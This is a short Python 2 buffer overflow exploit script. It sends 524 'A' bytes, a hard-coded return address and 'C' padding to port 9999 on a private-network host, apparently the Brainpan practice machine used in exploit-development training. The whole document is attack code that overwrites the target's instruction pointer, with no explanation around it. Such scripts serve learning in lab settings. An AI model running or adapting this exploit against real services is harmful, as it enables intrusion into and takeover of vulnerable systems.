#!/usr/bin/python2
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*524 + "\xf3\x12\x17\x31" + "C"*(900-524-4)

try:
     print "\sending evil buffer..."
     s.connect(('192.168.1.51',9999))
     data = s.recv(1024)
     s.send(buffer + '\r\n')
     print "\nDone!"

except:
     print "Count not connect to Brain!"
